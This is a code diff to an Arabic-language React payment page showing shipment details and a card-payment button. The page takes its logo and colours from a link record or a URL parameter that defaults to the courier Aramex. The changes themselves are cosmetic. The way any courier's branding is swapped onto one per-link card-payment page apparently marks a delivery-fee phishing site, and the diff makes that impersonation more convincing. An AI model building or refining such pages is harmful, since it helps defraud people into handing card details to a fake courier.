@@ -1,4 +1,5 @@
 import { useParams, useNavigate } from "react-router-dom";
+import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
@@ -13,6 +14,7 @@ const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const [logoError, setLogoError] = useState(false);
 
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -75,30 +77,63 @@ const PaymentDetails = () => {
   
   const paymentContent = (
     <>
+      {/* Service Logo & Branding */}
+      {branding.logo && !logoError ? (
+        <div className="mb-6 sm:mb-8 flex items-center justify-center">
+          <img 
+            src={branding.logo} 
+            alt={serviceName}
+            className="h-14 sm:h-20 object-contain max-w-[200px] sm:max-w-[280px]"
+            style={{ filter: 'drop-shadow(0 2px 8px rgba(0,0,0,0.1))' }}
+            onError={() => setLogoError(true)}
+          />
+        </div>
+      ) : (
+        <div 
+          className="mb-6 sm:mb-8 p-4 rounded-lg flex items-center justify-center"
+          style={{
+            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+          }}
+        >
+          <h2 className="text-xl sm:text-2xl font-bold text-white">{serviceName}</h2>
+        </div>
+      )}
+
       {/* Shipping Info Display */}
       {shippingInfo && (
-        <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
-          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
+        <div 
+          className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg border-2" 
+          style={{
+            background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`,
+            borderColor: `${branding.colors.primary}30`
+          }}
+        >
+          <h3 
+            className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
+            style={{ color: branding.colors.primary }}
+          >
+            تفاصيل الشحنة
+          </h3>
           <div className="space-y-2 text-xs sm:text-sm">
             {shippingInfo.tracking_number && (
               <div className="flex items-center gap-2">
-                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">رقم الشحنة:</span>
-                <span className="font-semibold">{shippingInfo.tracking_number}</span>
+                <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                <span className="text-muted-foreground text-xs sm:text-sm">رقم الشحنة:</span>
+                <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.tracking_number}</span>
               </div>
             )}
             {shippingInfo.package_description && (
               <div className="flex items-center gap-2">
-                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">وصف الطرد:</span>
-                <span className="font-semibold">{shippingInfo.package_description}</span>
+                <Truck className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                <span className="text-muted-foreground text-xs sm:text-sm">وصف الطرد:</span>
+                <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.package_description}</span>
               </div>
             )}
             {shippingInfo.cod_amount > 0 && (
               <div className="flex items-center gap-2">
-                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                <span className="text-muted-foreground">مبلغ COD:</span>
-                <span className="font-semibold">{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
+                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                <span className="text-muted-foreground text-xs sm:text-sm">مبلغ COD:</span>
+                <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
               </div>
             )}
           </div>
@@ -107,9 +142,9 @@ const PaymentDetails = () => {
       
       {/* Payment Summary */}
       <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
+        <div className="flex justify-between py-2 sm:py-3 border-b text-sm sm:text-base" style={{ borderColor: `${branding.colors.primary}20` }}>
           <span className="text-muted-foreground">الخدمة</span>
-          <span className="font-semibold">{serviceName}</span>
+          <span className="font-semibold" style={{ color: branding.colors.text }}>{serviceName}</span>
         </div>
         
         <div 
@@ -127,20 +162,30 @@ const PaymentDetails = () => {
     
       {/* Payment Method */}
       <div className="mb-6 sm:mb-8">
-        <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
+        <h3 
+          className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
+          style={{ color: branding.colors.primary }}
+        >
+          طريقة الدفع
+        </h3>
         <div 
-          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4"
+          className="border-2 rounded-lg sm:rounded-xl p-4 sm:p-5 transition-all hover:shadow-lg"
           style={{
             borderColor: branding.colors.primary,
-            background: `${branding.colors.primary}10`
+            background: `linear-gradient(135deg, ${branding.colors.primary}10, ${branding.colors.secondary}10)`
           }}
         >
-          <div className="flex items-center gap-2 sm:gap-3">
-            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
+          <div className="flex items-center gap-3 sm:gap-4">
+            <div 
+              className="w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center"
+              style={{ background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})` }}
+            >
+              <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
+            </div>
             <div>
-              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
-              <p className="text-xs sm:text-sm text-muted-foreground">
-                Visa، Mastercard، Mada
+              <p className="font-bold text-sm sm:text-base" style={{ color: branding.colors.text }}>الدفع بالبطاقة</p>
+              <p className="text-xs sm:text-sm" style={{ color: branding.colors.textLight }}>
+                Visa • Mastercard • Mada
               </p>
             </div>
           </div>
@@ -151,17 +196,17 @@ const PaymentDetails = () => {
       <Button
         onClick={handleProceed}
         size="lg"
-        className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+        className="w-full text-base sm:text-lg py-6 sm:py-7 text-white font-bold hover:opacity-90 transition-all hover:scale-[1.02] shadow-lg"
         style={{
           background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
         }}
       >
         <span className="ml-2">الدفع بالبطاقة</span>
-        <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+        <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 mr-2" />
       </Button>
     
-      <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-        بالمتابعة، أنت توافق على الشروط والأحكام
+      <p className="text-[10px] sm:text-xs text-center mt-4 sm:mt-5" style={{ color: branding.colors.textLight }}>
+        🔒 بالمتابعة، أنت توافق على الشروط والأحكام
       </p>
     </>
   );
